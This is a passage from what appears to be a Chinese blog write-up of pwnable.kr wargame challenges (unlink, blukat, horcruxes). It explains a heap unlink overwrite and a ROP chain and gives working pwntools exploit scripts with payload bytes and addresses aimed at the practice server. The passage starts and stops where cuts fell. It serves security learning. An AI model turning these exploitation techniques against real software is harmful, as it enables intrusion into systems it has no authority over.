class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">fd</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">bk</span>;</span></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">8</span>];</span><br><span class="line">&#125;OBJ;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unlink</span><span class="params">(OBJ* P)</span>&#123;</span><br><span class="line">    OBJ* BK;</span><br><span class="line">    OBJ* FD;</span><br><span class="line">    BK=P-&gt;bk;</span><br><span class="line">    FD=P-&gt;fd;</span><br><span class="line">    FD-&gt;bk=BK;</span><br><span class="line">    BK-&gt;fd=FD;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">    OBJ* A = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">    OBJ* B = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">    OBJ* C = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// double linked list: A &lt;-&gt; B &lt;-&gt; C</span></span><br><span class="line">    A-&gt;fd = B;</span><br><span class="line">    B-&gt;bk = A;</span><br><span class="line">    B-&gt;fd = C;</span><br><span class="line">    C-&gt;bk = B;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;here is stack address leak: %p\n&quot;</span>, &amp;A);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;here is heap address leak: %p\n&quot;</span>, A);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;now that you have leaks, get shell!\n&quot;</span>);</span><br><span class="line">    <span class="comment">// heap overflow!</span></span><br><span class="line">    gets(A-&gt;buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// exploit this unlink!</span></span><br><span class="line">    unlink(B);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最简单的一个 unlink 漏洞，该给的都给了，甚至连栈上和堆上的地址都给了，和 malloc 的 unlink 相比也没有任何的安全检查。unlink 的最基本原理就是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fd = p-&gt;fd;</span><br><span class="line">bk = p-&gt;bk;</span><br><span class="line">fd-&gt;bk = bk;</span><br><span class="line">bk-&gt;fd = fd;</span><br></pre></td></tr></table></figure><p>如果我们可以控制 p 的 fd 和 bk，就可以实现任意地址写，其中 fd 为某个地址，bk 为我们要写入的值，如下所示，其中 a 和 b 需要可写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd = a;</span><br><span class="line">p-&gt;bk = b;</span><br><span class="line"></span><br><span class="line">fd = p-&gt;fd = a;</span><br><span class="line">bk = p-&gt;bk = b;</span><br><span class="line"></span><br><span class="line">fd-&gt;bk = *(fd + <span class="number">4</span>) = *(a + <span class="number">4</span>) = bk = b;</span><br><span class="line">bk-&gt;fd = *(bk + <span class="number">0</span>) = *b = fd = a;</span><br></pre></td></tr></table></figure><p>题目最开始 malloc 了 1024 的 chunk，然后 malloc 了 3 个 OBJ：A，B 和 C，组成了一个双向链表，A 的 buf 有一个堆溢出，最后 unlink B 触发 unlink 漏洞。由于 B 在 A 的后面 malloc，所以 B 在 A 的物理高地址相邻，通过 A 可以修改 B 的 fd 和 bk。我们的最终目的是在 main 函数结束 ret 的时候跳转到 shell 的地址，那么就需要控制栈顶 esp 的值，而在 main 的最后有一个 ecx，如下所示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x080485f2 &lt;+195&gt;:    call   0x8048504 &lt;unlink&gt;</span><br><span class="line">0x080485f7 &lt;+200&gt;:    add    esp,0x10</span><br><span class="line">0x080485fa &lt;+203&gt;:    mov    eax,0x0</span><br><span class="line">0x080485ff &lt;+208&gt;:    mov    ecx,DWORD PTR [ebp-0x4]</span><br><span class="line">0x08048602 &lt;+211&gt;:    leave</span><br><span class="line">0x08048603 &lt;+212&gt;:    lea    esp,[ecx-0x4]</span><br><span class="line">0x08048606 &lt;+215&gt;:    ret</span><br></pre></td></tr></table></figure><p>首先把 ebp-4 的值放到 ecx 里，然后用 leave 缩减栈，最后在 ret 前有一个 lea 可以把 ecx-4 的值写入 esp，那么如果我们可以控制 ebp-4 的值，那么就可以控制 ecx，最后就可以控制 esp 了，ebp 是固定的，通过提供的栈地址很容易可以算出 ebp-4 的位置位于提供的栈地址 +16 处。我们可以将 shell 地址写到堆上，然后通过 unlink 写入到 ebp-4，最后通过 lea 将 shell 地址写入 esp，ret 的时候就可以控制 eip 跳转到 shell 地址了，通过查看堆上内容，可以算出我们写入的 shell 偏移为提供的堆地址 +8 处（+8 是因为要跳过 A 的 fd 和 bk），最后由于 ecx 在 lea 前还减了 4，我们要再补上 4。还有需要注意的是 malloc 出的 chunk 的里的 buf 大小为 8 字节，除去我们输入的 4 字节的 shell 地址，还有 4 字节的 junk 需要填充，之后还需要填充 B 的 chunk 的 prev_size 和 size 一共 8 个字节，然后就可以覆盖 B 的 fd 和 bk。最终的 exp 如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">HOST = <span class="string">&#x27;pwnable.kr&#x27;</span></span><br><span class="line">PORT = <span class="number">9026</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.clear(arch=&#x27;amd64&#x27;)</span></span><br><span class="line">context.update(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;/home/unlink/unlink&quot;</span>)</span><br><span class="line"><span class="comment"># pg = cyclic_gen()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line">shell_addr = <span class="number">0x080484eb</span></span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">&#x27;here is stack address leak: &#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(conn.recv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&#x27;Get stack address: %s&#x27;</span> % <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">&#x27;here is heap address leak: &#x27;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(conn.recv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&#x27;Get heap address: %s&#x27;</span> % <span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">fd = heap_addr + <span class="number">8</span> + <span class="number">4</span></span><br><span class="line">bk = stack_addr + <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">conn.sendlineafter(<span class="string">&#x27;now that you have leaks, get shell!\n&#x27;</span>, p32(shell_addr) +  <span class="string">&#x27;a&#x27;</span> * (<span class="number">8</span> - <span class="number">4</span> + <span class="number">4</span> + <span class="number">4</span>) + p32(fd) + p32(bk))</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="blukat-3-pt"><a href="#blukat-3-pt" class="headerlink" title="blukat (3 pt)"></a>blukat (3 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> flag[<span class="number">100</span>];</span><br><span class="line"><span class="type">char</span> password[<span class="number">100</span>];</span><br><span class="line"><span class="type">char</span>* key = <span class="string">&quot;3\rG[S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">calc_flag</span><span class="params">(<span class="type">char</span>* s)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="built_in">strlen</span>(s); i++)&#123;</span><br><span class="line">        flag[i] = s[i] ^ key[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    FILE* fp = fopen(<span class="string">&quot;/home/blukat/password&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    fgets(password, <span class="number">100</span>, fp);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;guess the password!\n&quot;</span>);</span><br><span class="line">    fgets(buf, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(password, buf))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;congrats! here is your flag: &quot;</span>);</span><br><span class="line">        calc_flag(password);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;wrong guess!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是一道很迷惑的题，乍一看 buf 处可以溢出 28 个字节，但是这个题和溢出没有任何关系。最后的目的是我们需要输入一个 password，相等的话就给 flag，不然就 exit，和溢出相关的就只有 fgets 以后到 strcmp 之前这段，这之后的代码我们完全不可控制，首先我们不可能知道 password，所以不会进 calc_flag 的分支，但是进另一个分支就直接 exit 了，连 main 的 return 都没执行，所以这个题和溢出没有任何关系。</p><p>所以我们就得想办法拿到 password，想办法从程序里弄已经是不可能了，就只能考虑其他办法，直接 cat，返回 <code>cat: password: Permission denied</code>，但是我们再 head 一下，发现还是返回的<code>cat: password: Permission denied</code>，所以，这句话就是 password 的内容，并且我们是可读的，看一下 password 的权限，是<code>-rw-r-----</code>，并且属于 blukat_pwn 组，而正好我们也是 blukat_pwn，所以 password 本身就是可读的，问题就简单很多了，直接<code>cat password | ./blukat</code> 即可。</p><p>其实仔细想想，这题才 3 分，前一个 unlink 都 10 分，所以这题肯定不会太复杂。</p><h1 id="horcruxes-7-pt"><a href="#horcruxes-7-pt" class="headerlink" title="horcruxes (7 pt)"></a>horcruxes (7 pt)</h1><p>这次没有给源码了，直接给了二进制程序，IDA 分析一下，上来就看见个 seccomp，所以还是个沙箱题。题目给了个 hint，说伏地魔把分裂的灵魂藏在了 7 个魂器里，正好题目里有 ABCDEFG 一共 7 个函数，先看一下最开始的 init_ABCDEFG。首先从 urandom 里读了 4 个字节到 buf 里，然后用 buf[0]作为随机数的种子，之后 random 出来 7 个数，求和放入 sum 里。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">init_ABCDEFG</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (read(fd, buf, <span class="number">4u</span>) != <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/dev/urandom error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  close(fd);</span><br><span class="line">  srand(*buf);</span><br><span class="line">  a = <span class="number">0xDEADBEEF</span> * rand() % <span class="number">0xCAFEBABE</span>;</span><br><span class="line">  b = <span class="number">0xDEADBEEF</span> * rand() % <span class="number">0xCAFEBABE</span>;</span><br><span class="line">  c = <span class="number">0xDEADBEEF</span> * rand() % <span class="number">0xCAFEBABE</span>;</span><br><span class="line">  d = <span class="number">0xDEADBEEF</span> * rand() % <span class="number">0xCAFEBABE</span>;</span><br><span class="line">  e = <span class="number">0xDEADBEEF</span> * rand() % <span class="number">0xCAFEBABE</span>;</span><br><span class="line">  f = <span class="number">0xDEADBEEF</span> * rand() % <span class="number">0xCAFEBABE</span>;</span><br><span class="line">  v0 = rand();</span><br><span class="line">  g = <span class="number">0xDEADBEEF</span> * v0 % <span class="number">0xCAFEBABE</span>;</span><br><span class="line">  result = f + e + d + c + b + a + <span class="number">0xDEADBEEF</span> * v0 % <span class="number">0xCAFEBABE</span>;</span><br><span class="line">  sum = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主函数在 rop_me 里。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ropme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+4h] [ebp-74h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+68h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Select Menu:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> (v2 == a)</span><br><span class="line">  &#123;</span><br><span class="line">    A();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (v2 == b)</span><br><span class="line">  &#123;</span><br><span class="line">    B();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (v2 == c)</span><br><span class="line">  &#123;</span><br><span class="line">    C();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (v2 == d)</span><br><span class="line">  &#123;</span><br><span class="line">    D();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (v2 == e)</span><br><span class="line">  &#123;</span><br><span class="line">    E();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (v2 == f)</span><br><span class="line">  &#123;</span><br><span class="line">    F();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (v2 == g)</span><br><span class="line">  &#123;</span><br><span class="line">    G();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;How many EXP did you earned? : &quot;</span>);</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="keyword">if</span> (atoi(s) == sum )</span><br><span class="line">    &#123;</span><br><span class="line">      fd = open(<span class="string">&quot;flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      s[read(fd, s, <span class="number">0x64</span>u)] = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(s);</span><br><span class="line">      close(fd);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;d better get more experience to kill Voldemort&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 a 到 f 就是刚才的随机数，很明显我们不会知道那些随机数是什么，所以就进入了最后一个分支，这里有一个 gets，很明显的一个栈溢出，并且如果我们输入的字符串刚好就是 sum 的话就给我们 flag，所以这个题我们不一定需要 getshell，目的就是想办法泄漏出 sum。</p><p>没有开启 canary，所以这个栈溢出可以让我们任意地址跳转，首先我们肯定想直接调转到 open 那里，但是这里用的是 gets 获取的字符串，而 open flag 那里的地址为 0x080A010E，其中包含了 0x0a，而 gets 读取的时候遇到 0x0a 的时候就会停下，所以我们只能跳转到不包含 0x0a 的地址。再往前看，发现 A，B，C 那几个函数刚好在 0x0a 地址的前面，例如 A 的地址为<em>0x</em>0809FE4B，而调用 A 的时候刚好可以泄漏出 a 的值，这样从 A 到 G 依次调用一遍，我们就可以知道 a 到 g 的值，然后就能计算出 sum，最后再跳转到 ropme 执行一遍验证输入 sum 就可以拿到 flag，刚好 main 函数里 call ropme 的地址为<em>0x</em>0809FFFC，也不包含 0x0a，所以就可以形成一个 rop 链。</p><p>最终的 exp 如下。需要注意的是只有当 sum 是个负数的时候才能成功，具体原因还不清楚，debug 的时候发现若 sum 是个正数，atoi 的时候会失败，只有负数才会成功，所以需要多尝试几次。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> <span class="built_in">compile</span> <span class="keyword">as</span> re_compile</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">HOST = <span class="string">&#x27;pwnable.kr&#x27;</span></span><br><span class="line">PORT = <span class="number">9032</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.clear(arch=&#x27;amd64&#x27;)</span></span><br><span class="line">context.update(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">context.update(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./horcruxes&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line"></span><br><span class="line">A = <span class="number">0x0809FE4B</span></span><br><span class="line">B = <span class="number">0x0809FE6A</span></span><br><span class="line">C = <span class="number">0x0809FE89</span></span><br><span class="line">D = <span class="number">0x0809FEA8</span></span><br><span class="line">E = <span class="number">0x0809FEC7</span></span><br><span class="line">F = <span class="number">0x0809FEE6</span></span><br><span class="line">G = <span class="number">0x0809FF05</span></span><br><span class="line">ropme = <span class="number">0x0809FFFC</span></span><br><span class="line">conn.sendlineafter(<span class="string">&#x27;Select Menu:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">&#x27;How many EXP did you earned? : &#x27;</span>, pg.get(<span class="number">116</span>) + p32(<span class="number">4</span>) + p32(A) + p32(B) + p32(C) + p32(D) + p32(E) + p32(F) + p32(G) + p32(ropme))</span><br><span class="line">conn.recvline()</span><br><span class="line"></span><br><span class="line">findall = re_compile(<span class="string">r&#x27;\(EXP \+(-?\d+)\)&#x27;</span>).findall</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">int</span>(findall(conn.recvline())[<span class="number">0</span>])</span><br><span class="line">log.info(<span class="string">&#x27;Get a: %d&#x27;</span> % a)</span><br><span class="line">b = <span class="built_in">int</span>(findall(conn.recvline())[<span class="number">0</span>])</span><br><span class="line">log.info(<span class="string">&#x27;Get b: %d&#x27;</span> % b)</span><br><span class="line">c = <span class="built_in">int</span>(findall(conn.recvline())[<span class="number">0</span>])</span><br><span class="line">log.info(<span class="string">&#x27;Get c: %d&#x27;</span> % c)</span><br><span class="line">d = <span class="built_in">int</span>(findall(conn.recvline())[<span class="number">0</span>])</span><br><span class="line">log.info(<span class="string">&#x27;Get d: %d&#x27;</span> % d)</span><br><span class="line">e = <span class="built_in">int</span>(findall(conn.recvline())[<span class="number">0</span>])</span><br><span class="line">log.info(<span class="string">&#x27;Get e: %d&#x27;</span> % e)</span><br><span class="line">f = <span class="built_in">int</span>(findall(conn.recvline())[<span class="number">0</span>])</span><br><span class="line">log.info(<span class="string">&#x27;Get f: %d&#x27;</span> % f)</span><br><span class="line">g = <span class="built_in">int</span>(findall(conn.recvline())[<span class="number">0</span>])</span><br><span class="line">log.info(<span class="string">&#x27;Get g: %d&#x27;</span> % g)</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">str</span>(a+b+c+d+e+f+g)</span><br><span class="line">log.info(<span class="string">&#x27;Sum: &#x27;</span> + s)</span><br><span class="line">conn.sendlineafter(<span class="string">&#x27;Select Menu:&#x27;</span>, 